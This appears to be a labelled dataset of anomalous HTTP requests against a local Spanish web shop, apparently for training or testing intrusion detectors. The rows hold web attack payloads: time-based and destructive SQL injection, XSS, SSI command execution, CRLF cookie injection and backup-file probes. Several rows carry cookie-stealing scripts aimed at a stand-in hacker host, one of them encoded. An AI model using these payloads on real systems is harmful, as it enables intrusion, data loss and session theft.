POST,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas,,anomalous
POST,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsgA=Credenciales+incorrectas,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar%2520&precio=7651&B1=Confirmar,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar%2520&precio=7651&B1=Confirmar,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=%3F&B1=Confirmar,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=%3F&B1=Confirmar,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7651&B1=Confirmar%2F,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=7651&B1=Confirmar%2F,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioA=7651&B1=Confirmar,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precioA=7651&B1=Confirmar,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp.Old,,anomalous
GET,http://localhost:8080http://localhost:9090/examplesWebApp/OrderParser.jsp?xmlfile=C:/bea/weblogic81/samples/server/examples/src/examples/xml/orderParser/order.xml,,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=kumamotoparos%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2&password=GLo0Al&nombre=Nelo&apellidos=Marceni%F1o&email=touliatos%40intercambiodeenlaces.hr&dni=19782082N&direccion=C%2F+Andres+Bello%2C+92%2C+6C&ciudad=Alamedilla&cp=13670&provincia=Guadalajara&ntc=2637234925036276&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=kumamotoparos%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2&password=GLo0Al&nombre=Nelo&apellidos=Marceni%F1o&email=touliatos%40intercambiodeenlaces.hr&dni=19782082N&direccion=C%2F+Andres+Bello%2C+92%2C+6C&ciudad=Alamedilla&cp=13670&provincia=Guadalajara&ntc=2637234925036276&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&password=GLo0Al&nombre=Nelo&apellidos=Marceni%F1o&email=touliatos%40intercambiodeenlaces.hr&dni=19782082N&direccion=C%2F+Andres+Bello%2C+92%2C+6C&ciudad=Alamedilla&cp=13670&provincia=Guadalajara&ntc=2637234925036276&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&password=GLo0Al&nombre=Nelo&apellidos=Marceni%F1o&email=touliatos%40intercambiodeenlaces.hr&dni=19782082N&direccion=C%2F+Andres+Bello%2C+92%2C+6C&ciudad=Alamedilla&cp=13670&provincia=Guadalajara&ntc=2637234925036276&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=kumamoto&password=%274%2C%2CANGAne-3A&nombre=Nelo&apellidos=Marceni%F1o&email=touliatos%40intercambiodeenlaces.hr&dni=19782082N&direccion=C%2F+Andres+Bello%2C+92%2C+6C&ciudad=Alamedilla&cp=13670&provincia=Guadalajara&ntc=2637234925036276&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=kumamoto&password=%274%2C%2CANGAne-3A&nombre=Nelo&apellidos=Marceni%F1o&email=touliatos%40intercambiodeenlaces.hr&dni=19782082N&direccion=C%2F+Andres+Bello%2C+92%2C+6C&ciudad=Alamedilla&cp=13670&provincia=Guadalajara&ntc=2637234925036276&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=kumamoto&password=GLo0Al&nombreA=Nelo&apellidos=Marceni%F1o&email=touliatos%40intercambiodeenlaces.hr&dni=19782082N&direccion=C%2F+Andres+Bello%2C+92%2C+6C&ciudad=Alamedilla&cp=13670&provincia=Guadalajara&ntc=2637234925036276&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=kumamoto&password=GLo0Al&nombreA=Nelo&apellidos=Marceni%F1o&email=touliatos%40intercambiodeenlaces.hr&dni=19782082N&direccion=C%2F+Andres+Bello%2C+92%2C+6C&ciudad=Alamedilla&cp=13670&provincia=Guadalajara&ntc=2637234925036276&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%27OR%27a%3D%27a,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2=Vaciar+carrito%27OR%27a%3D%27a,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2=%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2A=Vaciar+carrito,anomalous
GET,http://localhost:8080/webapp/examples/HitCount,,anomalous
GET,http://localhost:8080/tienda1/global/estilos.css/asf-logo-wide,,anomalous
GET,http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg.BAK,,anomalous
GET,http://localhost:8080/tienda1/6909030637832563290.jsp.Bak,,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=tonie&password=fu43on2r&nombre=Ravi&apellidos=Mascarell+Yomona&email=payson_hoven%40quecole.za&dni=05111871Y&direccion=C%2F+Conde+Oliveto+S%2FN%2C+&ciudad=Taradell&cp=19247&provincia=%C1vila&ntc=7846969771020065%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=tonie&password=fu43on2r&nombre=Ravi&apellidos=Mascarell+Yomona&email=payson_hoven%40quecole.za&dni=05111871Y&direccion=C%2F+Conde+Oliveto+S%2FN%2C+&ciudad=Taradell&cp=19247&provincia=%C1vila&ntc=7846969771020065%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=tonie&password=fu43on2r&nombre=Ravi&apellidos=Mascarell+Yomona&email=payson_hoven%40quecole.za&dni=628B4B11B07R&direccion=C%2F+Conde+Oliveto+S%2FN%2C+&ciudad=Taradell&cp=19247&provincia=%C1vila&ntc=7846969771020065&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=tonie&password=fu43on2r&nombre=Ravi&apellidos=Mascarell+Yomona&email=payson_hoven%40quecole.za&dni=628B4B11B07R&direccion=C%2F+Conde+Oliveto+S%2FN%2C+&ciudad=Taradell&cp=19247&provincia=%C1vila&ntc=7846969771020065&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=tonie&password=fu43on2r&nombre=Ravi&apellidos=Mascarell+Yomona&email=payson_hoven%40quecole.za&dni=05111871Y&direccion=C%2F+Conde+Oliveto+S%2FN%2C+&ciudad=Taradell&cp=19247&provincia=%C1vila&ntc=7846969771020065&B1A=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=tonie&password=fu43on2r&nombre=Ravi&apellidos=Mascarell+Yomona&email=payson_hoven%40quecole.za&dni=05111871Y&direccion=C%2F+Conde+Oliveto+S%2FN%2C+&ciudad=Taradell&cp=19247&provincia=%C1vila&ntc=7846969771020065&B1A=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/fotos.jsp.INC,,anomalous
GET,http://localhost:8080/_vti_bin/fpcount.exe,,anomalous
GET,http://localhost:8080/tienda1/imagenes/2.gif/asf-logo-wide.gif/.INC,,anomalous
GET,http://localhost:8080/examplesWebApp/index.jsp,,anomalous
GET,http://localhost:8080.Bak,,anomalous
GET,http://localhost:8080/tienda1/index.jsp/asf-logo-wide.gif/,,anomalous
GET,http://localhost:8080/tienda1/index.jsp.BAK,,anomalous
PUT,http://localhost:8080/tienda1/publico/anadir.jsp,id=2&nombre=Queso+Manchego&precio=100&cantidad=44&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=100&cantidad=44&B1=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=2&nombre=Queso+Manchego&precio=100&cantidad=44&B1=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=3%2F&nombre=Queso+Manchego&precio=100&cantidad=44&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=3%2F&nombre=Queso+Manchego&precio=100&cantidad=44&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=100&cantidad=44&B1A=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=2&nombre=Queso+Manchego&precio=100&cantidad=44&B1A=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/asf-logo-wide,,anomalous
PUT,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=tine&pwd=v%E1L70am4390&remember=on&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=tine&pwd=v%E1L70am4390any%250ASet-cookie%253A%2BTamper%253D1041264011025374727&remember=on&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=tine&pwd=v%E1L70am4390any%250ASet-cookie%253A%2BTamper%253D1041264011025374727&remember=on&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=renem%2Fa&pwd=v%E1L70am4390&remember=on&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=renem%2Fa&pwd=v%E1L70am4390&remember=on&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modoA=entrar&login=tine&pwd=v%E1L70am4390&remember=on&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modoA=entrar&login=tine&pwd=v%E1L70am4390&remember=on&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp/4861362529278789730,,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=1sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=1,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,idA=1,anomalous
GET,http://localhost:8080/catalog.nsf,,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectassessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F,,anomalous
POST,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=Credenciales+incorrectassessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas,,anomalous
POST,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsgA=Credenciales+incorrectas,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=%4040&B1=Pasar+por+caja,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=%4040&B1=Pasar+por+caja,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1737&B1=Confirmar%2F,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=1737&B1=Confirmar%2F,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modoA=insertar&precio=1737&B1=Pasar+por+caja,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modoA=insertar&precio=1737&B1=Pasar+por+caja,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=storelli&password=enforrar&nombre=Adelfo&apellidos=Pozo+Carbot&email=schiaftino%40showenvivo.com.sy%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&dni=56891172M&direccion=Calle+Virgen+De+La+Estrella%2C+150%2C+&ciudad=Fresno+de+Rodilla&cp=49624&provincia=Valencia&ntc=3044392117548178&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=storelli&password=enforrar&nombre=Adelfo&apellidos=Pozo+Carbot&email=schiaftino%40showenvivo.com.sy%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&dni=56891172M&direccion=Calle+Virgen+De+La+Estrella%2C+150%2C+&ciudad=Fresno+de+Rodilla&cp=49624&provincia=Valencia&ntc=3044392117548178&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=storelli&password=enforrar&nombre=Adelfo&apellidos=Pozo+Carbot&email=schiaftino%40showenvivo.com.sy&dni=56891172M&direccion=Calle+Virgen+De+La+Estrella%2C+150%2C+&ciudad=Fresno+de+Rodilla&cp=49624&provincia=%2520&ntc=3044392117548178&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=storelli&password=enforrar&nombre=Adelfo&apellidos=Pozo+Carbot&email=schiaftino%40showenvivo.com.sy&dni=56891172M&direccion=Calle+Virgen+De+La+Estrella%2C+150%2C+&ciudad=Fresno+de+Rodilla&cp=49624&provincia=%2520&ntc=3044392117548178&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=storelli&password=enforrar&nombre=Adelfo&apellidos=Pozo+Carbot&email=schiaftino%40showenvivo.com.sy&dni=56891172M&direccion=Calle+Virgen+De+La+Estrella%2C+150%2C+&ciudad=Fresno+de+Rodilla&cp=4216A&provincia=Valencia&ntc=3044392117548178&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=storelli&password=enforrar&nombre=Adelfo&apellidos=Pozo+Carbot&email=schiaftino%40showenvivo.com.sy&dni=56891172M&direccion=Calle+Virgen+De+La+Estrella%2C+150%2C+&ciudad=Fresno+de+Rodilla&cp=4216A&provincia=Valencia&ntc=3044392117548178&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%253F,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2=Vaciar+carrito%253F,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2A=Vaciar+carrito,anomalous
GET,http://localhost:8080/tienda1/global/creditos.jsp/asf-logo-wide.gif.Inc,,anomalous
GET,http://localhost:8080/tienda1/global/asf-logo-wide.gif/.bak,,anomalous
GET,http://localhost:8080/asf-logo-wide.gif.Bak,,anomalous
GET,http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg.BAK,,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=hamilton&password=178gaTorIO&nombre=%27+DELETE+FROM+USERS&apellidos=Maquieira+San+Segundo&email=glaessner-alwood%40softwaremasservicio.ic&dni=29189199Z&direccion=Redonda%2C+142%2C+13-G&ciudad=R%E1bade&cp=08673&provincia=Le%F3n&ntc=7739977532136253&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=hamilton&password=178gaTorIO&nombre=%27+DELETE+FROM+USERS&apellidos=Maquieira+San+Segundo&email=glaessner-alwood%40softwaremasservicio.ic&dni=29189199Z&direccion=Redonda%2C+142%2C+13-G&ciudad=R%E1bade&cp=08673&provincia=Le%F3n&ntc=7739977532136253&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=e*berle&password=178gaTorIO&nombre=Guida&apellidos=Maquieira+San+Segundo&email=glaessner-alwood%40softwaremasservicio.ic&dni=29189199Z&direccion=Redonda%2C+142%2C+13-G&ciudad=R%E1bade&cp=08673&provincia=Le%F3n&ntc=7739977532136253&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=e*berle&password=178gaTorIO&nombre=Guida&apellidos=Maquieira+San+Segundo&email=glaessner-alwood%40softwaremasservicio.ic&dni=29189199Z&direccion=Redonda%2C+142%2C+13-G&ciudad=R%E1bade&cp=08673&provincia=Le%F3n&ntc=7739977532136253&B1=Registrar,anomalous
GET,http://localhost:8080/asf-logo-wide.gif,,anomalous
GET,http://localhost:8080/tienda1/miembros/salir.jsp/.inc,,anomalous
GET,http://localhost:8080/tienda1/imagenes/logo.gif.INC,,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=85&cantidad=%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=3&nombre=Queso+Manchego&precio=85&cantidad=%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Jam%F3n%27+Ib%E9ric-%27o&precio=85&cantidad=80&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=3&nombre=Jam%F3n%27+Ib%E9ric-%27o&precio=85&cantidad=80&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=85&cantidadA=80&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=3&nombre=Queso+Manchego&precio=85&cantidadA=80&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=junibob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org&pwd=8EsCR1BIr&remember=on&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=junibob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org&pwd=8EsCR1BIr&remember=on&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=juni&pwd=+&remember=on&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=juni&pwd=+&remember=on&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=juni&pwd=%2Cj58A&remember=on&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=juni&pwd=%2Cj58A&remember=on&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&loginA=juni&pwd=8EsCR1BIr&remember=on&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&loginA=juni&pwd=8EsCR1BIr&remember=on&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%27+DELETE+FROM+USERS,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=%27+DELETE+FROM+USERS,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=2,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,idA=2,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp.java,,anomalous
GET,http://localhost:8080/IISSamples/sdk/asp/docs/CodeBrws.asp,,anomalous
GET,http://localhost:8080/tienda1.Inc,,anomalous
GET,http://localhost:8080/admin.nsf,,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E,,anomalous
POST,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E,anomalous
